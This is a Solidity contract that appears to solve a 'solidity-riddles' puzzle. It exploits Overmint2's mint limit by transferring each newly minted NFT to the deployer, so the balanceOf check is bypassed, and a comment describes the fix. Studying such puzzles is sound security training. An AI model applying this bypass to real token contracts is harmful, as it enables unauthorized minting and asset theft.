// SPDX-License-Identifier: MIT
pragma solidity >=0.8.15;

import {Overmint2} from "../solidity-riddles/Overmint2.sol";
import {ERC721, IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

/**
 * @title AttackOvermint2
 * @dev This contract demonstrates an attack on the Overmint2 contract
 */
contract AttackOvermint2 {
    address private immutable overmint2Add;
    address private immutable attaker;

    constructor(address _overmint2Add) {
        overmint2Add = _overmint2Add;
        attaker = msg.sender;
    }

    /**
     * @dev This contract demonstrates an attack on the Overmint2 contract.
     * mint() function check balanceOf(msg.sender) which can be exploided by sending tokens to
     * other address.
     *
     * To fix the vulnerability in the mint() function of the Overmint2 contract,
     * We should modify it to use a mapping to keep track of the number of tokens minted by each address.
     */
    function exploitOvermint2() external {
        Overmint2 overmint2 = Overmint2(overmint2Add);

        overmint2.mint();
        for (uint256 i = 1; i < 6; i++) {
            overmint2.mint();

            overmint2.safeTransferFrom(address(this), attaker, i);
        }
    }
}
